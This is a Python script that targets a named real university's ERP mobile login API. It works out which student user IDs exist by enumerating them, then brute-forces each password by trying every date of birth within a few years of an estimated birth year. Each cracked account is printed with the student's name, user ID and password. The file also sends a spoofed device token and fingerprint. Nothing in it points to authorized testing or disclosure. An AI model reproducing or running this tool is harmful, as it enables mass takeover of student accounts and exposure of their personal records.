from requests import Session

BASE_URL = "https://erp.iith.ac.in/MobileAPI/"

LOGIN_PATH = "GetMobileAppValidatePassword"

BODY = {
    "UserID": "",
    "DeviceType": "android",
    "FCMID" : "9uTC82PwTddsX7-l9My0M9:gQphngqrimY8RNWS3IPzZF4w9g-OU4FNwDpWPNmCQcF0sodLFZyuhU5JOI36faxcOT5f6roRi6oVHgVrprfht5kEMW6ei7LdeuPVlZ4wWHclEZhT2LTjh27ZDut8AcNB01kuz3vEdnpC,OS:33,Model:SM-M325F,BRAND:samsung,MANUFACTURER:samsung,Build ID:TP1A.220624.014",
    "Password": ""
}

req = Session()

def guess_user_yob():

    max_offset = 3
    degree = BODY["UserID"][4:9]
    year = 2000 + int(BODY["UserID"][2:4])
    
    if degree == "btech":
        yob = year - 18
    elif degree == "mtech":
        yob = year - 22
    elif degree == "resch":
        yob = year - 24
    
    yield yob

    for offset in range(1, max_offset + 1):
        yield yob + offset
        yield yob - offset
        


def get_user_pwd():
    global BODY

    data = req.post(BASE_URL + LOGIN_PATH, json=BODY).json()[0]
    if data["errorId"] == 1 and data["errorMessage"] == "User ID Not found":
        return None

    for yyyy in guess_user_yob():
        for mm in range(1, 13):
            for dd in range(1, 32):
                BODY["Password"] = f"{dd:02d}{mm:02d}{yyyy}"

                data = req.post(BASE_URL + LOGIN_PATH, json=BODY).json()[0]
                if data["errorId"] == 0:
                    print(f"{data['referenceId']}, {data['studentName']}, {BODY['UserID']}, {BODY['Password']}")
                    return True
                
    print(f"None, None, {BODY['UserID']}, None")
    return False


def get_user_id():
    global BODY
    
    for degree in degrees:
        for year in years:
            for branch in branches:
                for sno in range(11001, 11101):
                    BODY["UserID"] = f"{branch}{year}{degree}{sno}"
                    if get_user_pwd() is None:
                        break


if __name__ == "__main__":

    # * the userid scraping function (get_user_id) was designed for btech serial numbers
    # * if you want to scrape for other degrees, change the range values in the get_user_id function accordingly (for sno in range(start, end+1))
    # *     also change the years list accordingly
    degrees = ["btech"] #, "mtech", "resch"]

    years = [21, 22, 23, 24]
    branches = ["ai", "bm", "bt", "ce", "ch", "co", "cs", "ee", "ep", "es", "ic", "ma", "me", "ms"]

    try :
        get_user_id()
    except KeyboardInterrupt:
        pass
